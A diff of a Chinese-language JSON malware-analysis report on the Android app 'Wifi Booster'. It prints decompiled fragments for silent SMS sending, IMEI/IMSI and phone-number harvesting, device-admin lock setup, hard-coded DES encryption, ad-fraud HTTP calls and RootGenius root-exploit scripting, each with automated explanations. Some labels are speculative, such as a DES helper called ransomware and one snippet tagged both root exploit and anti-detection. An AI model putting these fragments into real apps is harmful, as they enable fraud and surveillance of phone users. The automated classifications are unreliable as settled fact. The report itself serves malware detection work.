@@ -6,7 +6,7 @@
     "应用名": "Wifi Booster",
     "是否恶意": true,
     "风险等级": "高",
-    "分析耗时(秒)": 696.4
+    "分析耗时(秒)": 1461.3
   },
   "行为列表": [
     {
@@ -30,10 +30,10 @@
           "method_signature": "onStartCommand(Intent intent, int i, int i2)",
           "malicious_behavior": "c2_communication",
           "behavior_type": "malicious",
-          "risk_level": "中",
-          "malicious_code_snippet": "public int onStartCommand(Intent intent, int i, int i2) {\n    if (intent != null) {\n        Message obtainMessage = this.n.obtainMessage();\n        obtainMessage.arg1 = i2;\n        obtainMessage.obj = intent.getExtras();\n        this.n.sendMessage(obtainMessage);\n    }\n    if (android.support.v7.util.k.a(this).m()) {\n        return 1;",
-          "malicious_code_snippet_context": "      }\n  \n      @Override // android.app.Service\n>>>     public int onStartCommand(Intent intent, int i, int i2) {\n>>>         String str = \"onStartCommand start id \" + i2 + \": \" + intent;\n>>>         j.a();\n>>>         if (intent != null) {\n>>>             Message obtainMessage = this.n.obtainMessage();\n>>>             obtainMessage.arg1 = i2;\n>>>             obtainMessage.obj = intent.getExtras();\n>>>             this.n.sendMessage(obtainMessage);\n>>>         }\n          if (android.support.v7.util.k.a(this).m()) {\n              return 1;\n          }",
-          "behavior_description": "该代码伪装在android.support.v7包下名为DaemonService的Service中，onStartCommand接收外部Intent，将intent.getExtras()提取后通过Handler(this.n)发送消息进行命令分发处理，疑似接收并解析C2下发的指令；同时返回START_STICKY(1)实现服务保活，确保C2通信通道持续运行。类名DaemonService及包名伪装均为恶意软件常用手法。",
+          "risk_level": "高",
+          "malicious_code_snippet": "public int onStartCommand(Intent intent, int i, int i2) {\n    if (intent != null) {\n        Message messageObtainMessage = this.n.obtainMessage();\n        messageObtainMessage.arg1 = i2;\n        messageObtainMessage.obj = intent.getExtras();\n        this.n.sendMessage(messageObtainMessage);\n    }\n    if (android.support.v7.util.k.a(this).m()) {\n        return 1;\n    }\n}",
+          "malicious_code_snippet_context": "      }\n  \n      @Override // android.app.Service\n>>>     public int onStartCommand(Intent intent, int i, int i2) {\n>>>         String str = \"onStartCommand start id \" + i2 + \": \" + intent;\n>>>         j.a();\n>>>         if (intent != null) {\n>>>             Message messageObtainMessage = this.n.obtainMessage();\n>>>             messageObtainMessage.arg1 = i2;\n>>>             messageObtainMessage.obj = intent.getExtras();\n>>>             this.n.sendMessage(messageObtainMessage);\n>>>         }\n>>>         if (android.support.v7.util.k.a(this).m()) {\n>>>             return 1;\n          }\n          a.submit(new n(this));\n          return 1;",
+          "behavior_description": "该代码位于伪装成 android.support.v7 官方支持库包名的 DaemonService（正规支持库中不存在此类，是恶意软件常用的包名伪装手法以规避检测）。onStartCommand 作为常驻服务入口，接收外部传入的 Intent（可能来自 C2 服务器指令下发、推送消息或定时任务触发），通过 intent.getExtras() 提取命令数据，封装为 Message 发送给内部 Handler(this.n) 在后台线程解析执行，构成远程指令的接收与分发通道。同时返回 START_STICKY(1) 使服务被系统杀死后自动重启，保证 C2 控制通道持久存活。数据流向：外部 Intent 携带的指令数据 → getExtras() 提取 → Handler.sendMessage() 分发执行。",
           "glm_analyzed": true
         }
       ]
@@ -64,9 +64,9 @@
           "malicious_behavior": "sms_fraud",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "SmsManager.getDefault().sendTextMessage(str, null, str2, PendingIntent.getBroadcast(context, 0, new Intent(), 0), null);",
-          "malicious_code_snippet_context": "          if (context == null) {\n              throw new IllegalArgumentException();\n          }\n>>>         SmsManager.getDefault().sendTextMessage(str, null, str2, PendingIntent.getBroadcast(context, 0, new Intent(), 0), null);\n      }\n  \n      public static void showIME(AppContext appContext, Activity activity) {",
-          "behavior_description": "该方法通过 SmsManager.sendTextMessage() 静默发送短信，目标号码和短信内容均由方法参数传入，无需用户确认即可发送，在恶意样本中通常用于向付费号码发送短信以实施短信欺诈或订阅扣费服务，直接造成用户经济损失。",
+          "malicious_code_snippet": "public static void sendSMS(Context context, String str, String str2) {\n    if (context == null) {\n        throw new IllegalArgumentException();\n    }\n    SmsManager.getDefault().sendTextMessage(str, null, str2, PendingIntent.getBroadcast(context, 0, new Intent(), 0), null);\n}",
+          "malicious_code_snippet_context": "          return getInstalledPackageInfo(appContext, set) != null;\n      }\n  \n>>>     public static void sendSMS(Context context, String str, String str2) {\n>>>         if (context == null) {\n>>>             throw new IllegalArgumentException();\n>>>         }\n>>>         SmsManager.getDefault().sendTextMessage(str, null, str2, PendingIntent.getBroadcast(context, 0, new Intent(), 0), null);\n>>>     }\n  \n      public static void showIME(AppContext appContext, Activity activity) {\n          if (appContext == null || activity == null) {",
+          "behavior_description": "该代码在 AppUtils 工具类中封装了一个静默发送短信的方法 sendSMS。目标号码（str）和短信内容（str2）均由上层调用者传入，未经任何用户确认或系统短信界面，直接通过 SmsManager.getDefault().sendTextMessage() 在后台静默发送短信。数据流向为：调用方传入的目标号码与短信内容 → SmsManager.sendTextMessage() 静默发送。由于该样本已被确认为恶意软件，此类无用户感知的短信发送能力通常被用于短信欺诈（如向付费号码发送订阅短信、消耗用户话费）或向指定号码外传设备信息，直接造成用户经济损失。",
           "glm_analyzed": true
         }
       ]
@@ -94,11 +94,40 @@
           "class_path": "Landroid\\support\\v7\\util\\a;",
           "method_signature": "if(r == null)",
           "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(\"phone\");\nr.a = telephonyManager.getDeviceId();\nr.b = telephonyManager.getSubscriberId();\nr.c = telephonyManager.getLine1Number();\nr.d = telephonyManager.getDeviceSoftwareVersion();\nr.e = telephonyManager.getSimSerialNumber();\nr.f = Build.BRAND;\nr.g = Build.MODEL;\nr.h = String.valueOf(Build.VERSION.SDK_INT);\nr.i = Build.VERSION.RELEASE;\nr.j = Build.MANUFACTURER;\nr.k = Build.CPU_ABI;",
+          "malicious_code_snippet_context": "          if (r == null) {\n              r = new a();\n              try {\n>>>                 TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(\"phone\");\n>>>                 r.a = telephonyManager.getDeviceId();\n>>>                 r.b = telephonyManager.getSubscriberId();\n>>>                 r.c = telephonyManager.getLine1Number();\n>>>                 r.d = telephonyManager.getDeviceSoftwareVersion();\n>>>                 r.e = telephonyManager.getSimSerialNumber();\n>>>                 r.f = Build.BRAND;\n>>>                 r.g = Build.MODEL;\n>>>                 r.h = String.valueOf(Build.VERSION.SDK_INT);\n>>>                 r.i = Build.VERSION.RELEASE;\n>>>                 r.j = Build.MANUFACTURER;\n>>>                 r.k = Build.CPU_ABI;\n                  r.l = telephonyManager.getSimCountryIso();\n                  r.m = context.getResources().getConfiguration().locale.getLanguage();\n                  r.n = context.getPackageName();",
+          "behavior_description": "该代码伪装成Android官方支持库类（android.support.v7.util.a，真实support库的util包中并不存在此类，属于恶意代码常用的包名伪装隐藏手法）。在单例初始化时，通过TelephonyManager批量读取设备敏感标识：IMEI(getDeviceId)、IMSI(getSubscriberId)、本机手机号(getLine1Number)、SIM卡序列号(getSimSerialNumber)、设备软件版本，同时读取Build静态字段收集品牌、型号、SDK版本、系统版本、制造商、CPU架构等硬件信息，一次性构建完整的设备指纹并缓存到单例字段中，供恶意样本后续上报C2服务器或进行设备追踪。数据流向：TelephonyManager系列API与Build系统字段（source）→ 敏感数据被缓存至单例对象字段用于设备指纹构建（sink，为后续隐私窃取/上报做准备）。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "location_tracking",
+      "中文名": "位置追踪",
+      "MITRE": "T1430",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.ACCESS_FINE_LOCATION"
+        ],
+        "字符串": [
+          "getLastKnownLocation",
+          "LocationManager"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\umeng\\common\\b;",
+          "method_signature": "if(a(context, \"android.permission.ACCESS_FINE_LOCATION\")",
+          "malicious_behavior": "location_tracking",
           "behavior_type": "grayware",
           "risk_level": "中",
-          "malicious_code_snippet": "r.a = telephonyManager.getDeviceId();\nr.b = telephonyManager.getSubscriberId();\nr.c = telephonyManager.getLine1Number();\nr.d = telephonyManager.getDeviceSoftwareVersion();\nr.e = telephonyManager.getSimSerialNumber();\nr.f = Build.BRAND;\nr.g = Build.MODEL;\nr.h = String.valueOf(Build.VERSION.SDK_INT);\nr.i = Build.VERSION.RELEASE;\nr.j = Build.MANUFACTURER;\nr.k = Build.CPU_ABI;",
-          "malicious_code_snippet_context": "              r = new a();\n              try {\n                  TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(\"phone\");\n>>>                 r.a = telephonyManager.getDeviceId();\n>>>                 r.b = telephonyManager.getSubscriberId();\n>>>                 r.c = telephonyManager.getLine1Number();\n>>>                 r.d = telephonyManager.getDeviceSoftwareVersion();\n>>>                 r.e = telephonyManager.getSimSerialNumber();\n>>>                 r.f = Build.BRAND;\n>>>                 r.g = Build.MODEL;\n>>>                 r.h = String.valueOf(Build.VERSION.SDK_INT);\n>>>                 r.i = Build.VERSION.RELEASE;\n>>>                 r.j = Build.MANUFACTURER;\n>>>                 r.k = Build.CPU_ABI;\n                  r.l = telephonyManager.getSimCountryIso();\n                  r.m = context.getResources().getConfiguration().locale.getLanguage();\n                  r.n = context.getPackageName();",
-          "behavior_description": "代码通过 TelephonyManager 批量采集设备敏感标识符（IMEI、IMSI、手机号、SIM序列号、设备软件版本），同时收集 Build 硬件信息（品牌、型号、SDK版本、系统版本、制造商、CPU架构），将这些数据存储到静态单例对象的字段中，构成完整的设备指纹。数据流向：TelephonyManager.getDeviceId()/getSubscriberId()/getLine1Number()/getSimSerialNumber() → 静态变量 r.a/r.b/r.c/r.e（后续可能被上传至C2服务器）",
+          "malicious_code_snippet": "LocationManager locationManager = (LocationManager) context.getSystemService(\"location\");\nif (a(context, \"android.permission.ACCESS_FINE_LOCATION\") && (lastKnownLocation2 = locationManager.getLastKnownLocation(\"gps\")) != null) {\n    lastKnownLocation = lastKnownLocation2;\n} else if (a(context, \"android.permission.ACCESS_COARSE_LOCATION\") && (lastKnownLocation = locationManager.getLastKnownLocation(\"network\")) != null) {\n}\nreturn lastKnownLocation;",
+          "malicious_code_snippet_context": "          Location lastKnownLocation;\n          Location lastKnownLocation2;\n          try {\n>>>             LocationManager locationManager = (LocationManager) context.getSystemService(\"location\");\n>>>             if (a(context, \"android.permission.ACCESS_FINE_LOCATION\") && (lastKnownLocation2 = locationManager.getLastKnownLocation(\"gps\")) != null) {\n>>>                 Log.c(a, \"get location from gps:\" + lastKnownLocation2.getLatitude() + \",\" + lastKnownLocation2.getLongitude());\n>>>                 lastKnownLocation = lastKnownLocation2;\n>>>             } else if (a(context, \"android.permission.ACCESS_COARSE_LOCATION\") && (lastKnownLocation = locationManager.getLastKnownLocation(\"network\")) != null) {\n>>>                 Log.c(a, \"get location from network:\" + lastKnownLocation.getLatitude() + \",\" + lastKnownLocation.getLongitude());\n              } else {\n                  Log.c(a, \"Could not get location from GPS or Cell-id, lack ACCESS_COARSE_LOCATION or ACCESS_COARSE_LOCATION permission?\");\n                  lastKnownLocation = null;",
+          "behavior_description": "该代码位于友盟统计SDK（com.umeng.common）中，方法m()用于获取设备地理位置：先检查ACCESS_FINE_LOCATION权限并通过LocationManager.getLastKnownLocation(\"gps\")读取GPS精确经纬度，失败则降级检查ACCESS_COARSE_LOCATION并通过getLastKnownLocation(\"network\")读取基站粗略位置，最终将Location对象返回给SDK上层模块用于统计收集与上报。数据流向：系统位置服务→getLastKnownLocation()→SDK内部收集→上层模块上报远程服务器。在已确认恶意的样本中，此类隐蔽的SDK位置收集属于过度收集用户隐私（位置信息），但该片段本身仅被动读取缓存位置而非主动持续追踪，且属于知名统计SDK的标准功能，故判定为灰色行为而非明确恶意。",
           "glm_analyzed": true
         }
       ]
@@ -145,21 +174,21 @@
           "method_signature": "?(?)",
           "malicious_behavior": "ransomware",
           "behavior_type": "malicious",
-          "risk_level": "中",
+          "risk_level": "高",
           "malicious_code_snippet": "DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(\"device_policy\");\nif (!devicePolicyManager.isAdminActive(Dar.getCn(context))) {\n    context.startActivity(new Intent(context, (Class<?>) MainActivity.class).addFlags(268435456));\n}",
-          "malicious_code_snippet_context": "  /* loaded from: classes.dex */\n  public class DeviceSet {\n      public static void checkStatus(Context context) {\n>>>         DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(\"device_policy\");\n>>>         if (!devicePolicyManager.isAdminActive(Dar.getCn(context))) {\n>>>             context.startActivity(new Intent(context, (Class<?>) MainActivity.class).addFlags(268435456));\n>>>         }\n      }\n  }",
-          "behavior_description": "代码检查应用是否已激活设备管理员权限，若未激活则跳转至 MainActivity 引导用户授权，为后续利用 DevicePolicyManager 实施设备锁屏勒索做准备。",
+          "malicious_code_snippet_context": "  /* JADX INFO: loaded from: classes.dex */\n  public class DeviceSet {\n      public static void checkStatus(Context context) {\n>>>         DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(\"device_policy\");\n>>>         if (!devicePolicyManager.isAdminActive(Dar.getCn(context))) {\n>>>             context.startActivity(new Intent(context, (Class<?>) MainActivity.class).addFlags(268435456));\n>>>         }\n      }\n  }",
+          "behavior_description": "该代码通过 DevicePolicyManager 检查应用是否已激活设备管理员权限（isAdminActive），若未激活则以 FLAG_ACTIVITY_NEW_TASK 启动 MainActivity 引导用户激活设备管理器。这是勒索软件实现设备锁屏的典型前置步骤：一旦骗取设备管理员权限，恶意应用即可调用 lockNow() 锁定屏幕、resetPassword() 重置锁屏密码，并使自身无法被正常卸载，从而实现勒索锁屏。此外，该类位于伪装成 Google 官方组件的 com.google.set 包中，用于规避用户怀疑，结合样本已被厂商确认为恶意软件，此行为属于勒索锁屏权限准备环节。",
           "glm_analyzed": true
         },
         {
-          "class_path": "Lcom\\google\\set\\MainActivity;",
-          "method_signature": "?(?)",
+          "class_path": "Lcom\\adjust\\change\\DesUtils;",
+          "method_signature": "encryptDES(String encryptString)",
           "malicious_behavior": "ransomware",
-          "behavior_type": "malicious",
-          "risk_level": "高",
-          "malicious_code_snippet": "private static final int REQUEST_CODE_ADD_DEVICE_ADMIN = 100;\nprivate DevicePolicyManager devicePolicyManager = null;",
-          "malicious_code_snippet_context": "  \n  /* loaded from: classes.dex */\n  public class MainActivity extends Activity {\n>>>     private static final int REQUEST_CODE_ADD_DEVICE_ADMIN = 100;\n>>>     private DevicePolicyManager devicePolicyManager = null;\n  \n      @Override // android.app.Activity\n      protected void onCreate(Bundle savedInstanceState) {",
-          "behavior_description": "代码声明了DevicePolicyManager实例及设备管理员请求码REQUEST_CODE_ADD_DEVICE_ADMIN，用于请求Android设备管理员权限。在勒索软件中，获取DeviceAdmin权限后通常会调用lockNow()强制锁定屏幕或resetPassword()重置锁屏密码，使受害者无法正常操作设备，配合文件加密实施勒索。",
+          "behavior_type": "grayware",
+          "risk_level": "低",
+          "malicious_code_snippet": "SecretKeySpec key = new SecretKeySpec(\"kokddlio\".getBytes(), CipherUtils.ALGORITHM_DES);\nCipher cipher = Cipher.getInstance(\"DES/CBC/PKCS5Padding\");\ncipher.init(1, key, zeroIv);\nbyte[] encryptedData = cipher.doFinal(encryptString.getBytes(encoding));",
+          "malicious_code_snippet_context": "  \n      public static String encryptDES(String encryptString) throws Exception {\n          IvParameterSpec zeroIv = new IvParameterSpec(iv);\n>>>         SecretKeySpec key = new SecretKeySpec(\"kokddlio\".getBytes(), CipherUtils.ALGORITHM_DES);\n>>>         Cipher cipher = Cipher.getInstance(\"DES/CBC/PKCS5Padding\");\n>>>         cipher.init(1, key, zeroIv);\n>>>         byte[] encryptedData = cipher.doFinal(encryptString.getBytes(encoding));\n          return encode(encryptedData);\n      }\n  ",
+          "behavior_description": "该代码使用硬编码的DES密钥\"kokddlio\"和固定IV（{1,2,3,4,5,6,7,8}）对传入字符串进行DES/CBC/PKCS5Padding加密，再经Base64编码输出密文。数据流向：待加密数据(encryptString，即被加密的文件内容/用户数据)→cipher.doFinal()执行DES加密→Base64编码生成不可读密文。配套的decryptDES方法使用同一硬编码密钥可逆向解密，符合勒索软件对用户数据加密以勒索的典型实现。此外该类伪装在com.adjust.change包下（仿冒知名Adjust SDK的包名结构），真实Adjust SDK中不存在此类，属于恶意伪装，进一步佐证其勒索加密的恶意意图。",
           "glm_analyzed": true
         }
       ]
@@ -191,9 +220,9 @@
           "malicious_behavior": "ad_fraud",
           "behavior_type": "grayware",
           "risk_level": "中",
-          "malicious_code_snippet": "conn.setRequestMethod(\"POST\");\nconn.addRequestProperty(\"Connection\", \"Keep-Alive\");\noutStream.write(content);\nbyte[] buffer = new byte[Utils.admob_banner_onAdFailedToLoad];\nbos.write(buffer, 0, len);",
-          "malicious_code_snippet_context": "          HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();\n          conn.setConnectTimeout(FileHttpResponseHandler.TIME_OUT);\n          conn.setReadTimeout(FileHttpResponseHandler.TIME_OUT);\n>>>         conn.setRequestMethod(\"POST\");\n>>>         conn.setDoOutput(true);\n>>>         conn.addRequestProperty(\"Connection\", \"Keep-Alive\");\n>>>         conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n>>>         conn.setRequestProperty(\"Content-Length\", String.valueOf(content.length));\n          OutputStream outStream = conn.getOutputStream();\n          outStream.write(content);\n          if (conn.getResponseCode() == 200) {",
-          "behavior_description": "代码位于伪装成 Adjust SDK 的类中，通过 HTTP POST 请求向远程服务器发送数据，并接收服务器响应。其中使用伪装成 AdMob 回调方法名的变量作为缓冲区大小，以隐蔽其真实的网络通信行为，可能用于接收隐藏广告指令或进行广告欺诈。",
+          "malicious_code_snippet": "conn.setRequestMethod(\"POST\");\nconn.setDoOutput(true);\nOutputStream outStream = conn.getOutputStream();\noutStream.write(content);\nif (conn.getResponseCode() == 200) {\n    byte[] buffer = new byte[Utils.admob_banner_onAdFailedToLoad];\n    while (true) {\n        int len = conn.getInputStream().read(buffer);\n        if (len == -1) { break; }\n        bos.write(buffer, 0, len);\n    }\n}",
+          "malicious_code_snippet_context": "          HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();\n          conn.setConnectTimeout(FileHttpResponseHandler.TIME_OUT);\n          conn.setReadTimeout(FileHttpResponseHandler.TIME_OUT);\n>>>         conn.setRequestMethod(\"POST\");\n>>>         conn.setDoOutput(true);\n>>>         conn.addRequestProperty(\"Connection\", \"Keep-Alive\");\n>>>         conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n>>>         conn.setRequestProperty(\"Content-Length\", String.valueOf(content.length));\n>>>         OutputStream outStream = conn.getOutputStream();\n>>>         outStream.write(content);\n>>>         if (conn.getResponseCode() == 200) {\n>>>             byte[] buffer = new byte[Utils.admob_banner_onAdFailedToLoad];\n>>>             while (true) {\n>>>                 int len = conn.getInputStream().read(buffer);\n>>>                 if (len == -1) {\n                      break;\n                  }\n                  bos.write(buffer, 0, len);",
+          "behavior_description": "该代码位于伪装成 Adjust SDK 的可疑类 com.adjust.change.HttpUtil 中（正规 Adjust SDK 包名为 com.adjust.sdk，此处为仿冒包名以规避检测），是一个 HTTP POST 网络通信工具。数据流向：本地数据 content → conn.getOutputStream() 静默外发至远程服务器；服务器返回响应码 200 时，conn.getInputStream() 返回的广告内容/配置数据 → 以混淆的 AdMob 相关常量 Utils.admob_banner_onAdFailedToLoad 作为缓冲区大小循环读取 → bos 写入内存。该工具类是隐藏广告欺诈行为的基础通信组件，用于从远程服务器拉取广告内容或指令、上报虚假广告展示统计，配合隐藏 WebView/后台加载实现广告欺诈变现，同时造成用户流量与电量消耗。",
           "glm_analyzed": true
         }
       ]
@@ -215,13 +244,13 @@
       "恶意代码": [
         {
           "class_path": "Lcom\\shuame\\rootgenius\\sdk\\a\\q;",
-          "method_signature": "if(newPullParser.getName()",
+          "method_signature": "if(xmlPullParserNewPullParser.getName()",
           "malicious_behavior": "root_exploitation",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "newPullParser.setInput(new StringReader(str));\nfor (int eventType = newPullParser.getEventType(); eventType != 1; eventType = newPullParser.next()) {\n    switch (eventType) {\n        case 2:\n            if (newPullParser.getName().equals(\"solution\")) {\n                gVar.c.add(a(newPullParser));\n            } else if (newPullParser.getName().equals(\"superuser\")) {\n                b(newPullParser);\n            }\n    }\n}",
-          "malicious_code_snippet_context": "      private static void a(String str, g gVar) {\n          try {\n              XmlPullParser newPullParser = XmlPullParserFactory.newInstance().newPullParser();\n>>>             newPullParser.setInput(new StringReader(str));\n>>>             for (int eventType = newPullParser.getEventType(); eventType != 1; eventType = newPullParser.next()) {\n>>>                 switch (eventType) {\n>>>                     case 2:\n>>>                         if (newPullParser.getName().equals(\"solution\")) {\n>>>                             gVar.c.add(a(newPullParser));\n>>>                             break;\n>>>                         } else if (newPullParser.getName().equals(\"product_id\")) {\n>>>                             gVar.b = newPullParser.nextText();\n>>>                             break;\n>>>                         } else if (newPullParser.getName().equals(\"superuser\")) {\n                              b(newPullParser);\n                              break;\n                          } else if (newPullParser.getName().equals(\"neo\")) {",
-          "behavior_description": "代码解析包含Root提权相关配置的XML字符串，当解析到'superuser'标签时，调用b(newPullParser)方法执行Root提权相关操作；解析到'solution'标签时，调用a(newPullParser)获取提权方案。数据流向：XML字符串(str) -> XmlPullParser解析 -> 执行Root提权操作(b/a方法)。",
+          "malicious_code_snippet": "if (xmlPullParserNewPullParser.getName().equals(\"solution\")) {\n    gVar.c.add(a(xmlPullParserNewPullParser));\n} else if (xmlPullParserNewPullParser.getName().equals(\"product_id\")) {\n    gVar.b = xmlPullParserNewPullParser.nextText();\n} else if (xmlPullParserNewPullParser.getName().equals(\"superuser\")) {\n    b(xmlPullParserNewPullParser);\n} else if (xmlPullParserNewPullParser.getName().equals(\"neo\")) {\n    gVar.d = xmlPullParserNewPullParser.nextText();\n}",
+          "malicious_code_snippet_context": "              for (int eventType = xmlPullParserNewPullParser.getEventType(); eventType != 1; eventType = xmlPullParserNewPullParser.next()) {\n                  switch (eventType) {\n                      case 2:\n>>>                         if (xmlPullParserNewPullParser.getName().equals(\"solution\")) {\n>>>                             gVar.c.add(a(xmlPullParserNewPullParser));\n>>>                         } else if (xmlPullParserNewPullParser.getName().equals(\"product_id\")) {\n>>>                             gVar.b = xmlPullParserNewPullParser.nextText();\n>>>                         } else if (xmlPullParserNewPullParser.getName().equals(\"superuser\")) {\n>>>                             b(xmlPullParserNewPullParser);\n>>>                         } else if (xmlPullParserNewPullParser.getName().equals(\"neo\")) {\n>>>                             gVar.d = xmlPullParserNewPullParser.nextText();\n>>>                         }\n                          break;\n                  }\n              }",
+          "behavior_description": "该代码位于RootGenius（卓大师一键Root）SDK的配置解析模块中，通过XmlPullParser解析root方案配置XML：提取\"solution\"节点（各设备的root提权漏洞利用方案，加入利用列表）、\"product_id\"节点（匹配当前设备型号以选择对应提权方案）、\"superuser\"节点（提权成功后需植入设备的superuser权限管理APK配置，交由b()进一步解析）以及\"neo\"节点。数据流向为：服务端下发/内置的XML提权方案配置 → 解析匹配设备product_id → 选定root漏洞利用方案并配置superuser植入，构成静默提权利用链的配置环节。在已确认的恶意样本中，该SDK被用于在用户不知情的情况下获取设备root权限，为后续静默安装、权限提升和深度控制铺路。",
           "glm_analyzed": true
         }
       ]
@@ -245,9 +274,9 @@
           "malicious_behavior": "code_execution",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "String replace = com.shuame.rootgenius.sdk.a.b(a(\"install\")).replace(\"bb=/data/local/tmp/busybox\", \"bb=\" + (this.b + \"Data/Bin/\") + \"busybox\").replace(\"/data/local/tmp/superuser\", this.b + \"Data/sutmp\").replace(\"/data/local/tmp/\", this.b + \"Data/\").replace(\"#!/system/bin/sh\\n\", \"\");",
-          "malicious_code_snippet_context": "      }\n  \n      public String e() {\n>>>         String replace = com.shuame.rootgenius.sdk.a.b(a(\"install\")).replace(\"bb=/data/local/tmp/busybox\", \"bb=\" + (this.b + \"Data/Bin/\") + \"busybox\").replace(\"/data/local/tmp/superuser\", this.b + \"Data/sutmp\").replace(\"/data/local/tmp/\", this.b + \"Data/\").replace(\"#!/system/bin/sh\\n\", \"\");\n          String str = \"install_script:\" + replace;\n          return replace;\n      }",
-          "behavior_description": "该方法从内部获取名为'install'的root安装脚本，通过字符串替换将脚本中busybox、superuser等二进制文件路径从系统临时目录(/data/local/tmp/)重定向到应用私有数据目录，并移除shell脚本的shebang行，生成一个可执行的root提权安装脚本。结合同类中d()方法检测uid=0判断root状态，该SDK(Root Genius)用于在设备上执行提权脚本安装su/superuser二进制，获取root权限后可执行任意高权限操作。",
+          "malicious_code_snippet": "String strB = com.shuame.rootgenius.sdk.a.b(this.b + \"Data/.rootgenius\"); return strB.indexOf(\"uid=0\") >= 0; String strReplace = com.shuame.rootgenius.sdk.a.b(a(\"install\")).replace(\"bb=/data/local/tmp/busybox\", \"bb=\" + (this.b + \"Data/Bin/\") + \"busybox\").replace(\"/data/local/tmp/superuser\", this.b + \"Data/sutmp\").replace(\"/data/local/tmp/\", this.b + \"Data/\").replace(\"#!/system/bin/sh\\n\", \"\");",
+          "malicious_code_snippet_context": "      }\n  \n      public final boolean d() {\n>>>         String strB = com.shuame.rootgenius.sdk.a.b(this.b + \"Data/.rootgenius\");\n          c();\n          return strB.indexOf(\"uid=0\") >= 0;\n      }",
+          "behavior_description": "该代码属于RootGenius静默Root SDK的提权模块。d()方法执行shell命令并解析输出，通过检查是否包含uid=0判断设备是否已获得root权限；e()方法从APK内置资源读取install提权脚本，将脚本中busybox、superuser等提权二进制文件的路径从/data/local/tmp/重定向到应用私有目录，并去除#!/system/bin/sh脚本头后返回，供后续以shell方式执行完成静默Root提权。数据流向：APK内置install提权脚本→路径重写与内容篡改→shell命令/脚本执行（提权）。",
           "glm_analyzed": true
         }
       ]
@@ -275,13 +304,13 @@
       "恶意代码": [
         {
           "class_path": "Lcom\\shuame\\rootgenius\\sdk\\a\\q;",
-          "method_signature": "if(newPullParser.getName()",
+          "method_signature": "if(xmlPullParserNewPullParser.getName()",
           "malicious_behavior": "anti_detection",
           "behavior_type": "malicious",
           "risk_level": "中",
-          "malicious_code_snippet": "newPullParser.setInput(new StringReader(str));\nfor (int eventType = newPullParser.getEventType(); eventType != 1; eventType = newPullParser.next()) {\n    switch (eventType) {\n        case 2:\n            if (newPullParser.getName().equals(\"solution\")) {\n                gVar.c.add(a(newPullParser));\n            } else if (newPullParser.getName().equals(\"product_id\")) {\n                gVar.b = newPullParser.nextText();\n            } else if (newPullParser.getName().equals(\"superuser\")) {\n                b(newPullParser);\n            } else if (newPullParser.getName().equals(\"neo\")) {\n                gVar.d = newPullParser.nextText();\n            }\n    }\n}",
-          "malicious_code_snippet_context": "      private static void a(String str, g gVar) {\n          try {\n              XmlPullParser newPullParser = XmlPullParserFactory.newInstance().newPullParser();\n>>>             newPullParser.setInput(new StringReader(str));\n>>>             for (int eventType = newPullParser.getEventType(); eventType != 1; eventType = newPullParser.next()) {\n>>>                 switch (eventType) {\n>>>                     case 2:\n>>>                         if (newPullParser.getName().equals(\"solution\")) {\n>>>                             gVar.c.add(a(newPullParser));\n>>>                             break;\n>>>                         } else if (newPullParser.getName().equals(\"product_id\")) {\n>>>                             gVar.b = newPullParser.nextText();\n>>>                             break;\n>>>                         } else if (newPullParser.getName().equals(\"superuser\")) {\n>>>                             b(newPullParser);\n>>>                             break;\n>>>                         } else if (newPullParser.getName().equals(\"neo\")) {\n>>>                             gVar.d = newPullParser.nextText();\n                              break;\n                          } else {\n                              break;",
-          "behavior_description": "代码使用XmlPullParser解析XML配置数据，当解析到\"superuser\"标签时调用方法b(newPullParser)进行处理。该逻辑位于rootgenius SDK中，用于检测设备是否已Root（通过解析superuser相关配置信息），属于反Root检测行为。恶意软件利用此机制判断运行环境是否为Root设备或分析环境，从而决定是否执行恶意载荷或隐藏自身行为以规避安全检测。数据来源为XML字符串输入(StringReader)，危险操作为对superuser元素的解析处理b(newPullParser)，该处理结果用于后续的反检测决策。",
+          "malicious_code_snippet": "if (xmlPullParserNewPullParser.getName().equals(\"solution\")) {\n    gVar.c.add(a(xmlPullParserNewPullParser));\n} else if (xmlPullParserNewPullParser.getName().equals(\"product_id\")) {\n    gVar.b = xmlPullParserNewPullParser.nextText();\n} else if (xmlPullParserNewPullParser.getName().equals(\"superuser\")) {\n    b(xmlPullParserNewPullParser);\n} else if (xmlPullParserNewPullParser.getName().equals(\"neo\")) {\n    gVar.d = xmlPullParserNewPullParser.nextText();\n}",
+          "malicious_code_snippet_context": "              for (int eventType = xmlPullParserNewPullParser.getEventType(); eventType != 1; eventType = xmlPullParserNewPullParser.next()) {\n                  switch (eventType) {\n                      case 2:\n>>>                         if (xmlPullParserNewPullParser.getName().equals(\"solution\")) {\n>>>                             gVar.c.add(a(xmlPullParserNewPullParser));\n>>>                         } else if (xmlPullParserNewPullParser.getName().equals(\"product_id\")) {\n>>>                             gVar.b = xmlPullParserNewPullParser.nextText();\n>>>                         } else if (xmlPullParserNewPullParser.getName().equals(\"superuser\")) {\n>>>                             b(xmlPullParserNewPullParser);\n>>>                         } else if (xmlPullParserNewPullParser.getName().equals(\"neo\")) {\n>>>                             gVar.d = xmlPullParserNewPullParser.nextText();\n>>>                         }\n                          break;\n                  }\n              }",
